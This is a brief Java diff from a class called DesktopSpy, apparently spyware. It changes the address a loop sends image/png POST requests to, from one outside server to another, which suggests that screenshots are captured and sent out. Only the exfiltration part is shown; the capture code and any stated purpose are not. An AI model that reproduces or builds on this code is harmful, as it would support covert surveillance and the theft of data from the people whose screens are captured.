@@ -29,7 +29,7 @@ final class DesktopSpy implements Runnable {
             );
 
             while (thread.isAlive()) {
-                URL url = new URL("http://colibri.wbest.org/test.php");
+                URL url = new URL("https://site.ru/");
                 HttpURLConnection http = (HttpURLConnection) url.openConnection();
                 http.setRequestMethod("POST");
                 http.setRequestProperty("Content-Type", "image/png;");
